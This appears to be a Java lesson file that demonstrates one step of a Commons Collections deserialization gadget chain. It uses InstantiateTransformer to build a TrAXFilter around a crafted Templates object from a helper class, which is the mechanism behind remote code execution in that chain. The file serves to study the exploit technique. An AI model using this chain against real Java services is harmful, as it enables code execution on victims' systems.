package edu.demo.lesson2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import edu.demo.makeTemplates.MakeTemplates;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;

public class InstTransformer {
    public static void main(String[] args) throws Exception{
        //get templatesChian
        MakeTemplates makeTemplates = new MakeTemplates();
        Templates templates = (Templates) makeTemplates.makeTemplate();
        //use InstantiateTransformer.tranform() to new a TrAXFilter
        Class[] iParamTypes = new Class[]{Templates.class};
        Object[] iArgs = new Object[]{templates};
        InstantiateTransformer instTmer = new InstantiateTransformer(iParamTypes, iArgs);
        instTmer.transform(TrAXFilter.class);
    }
}
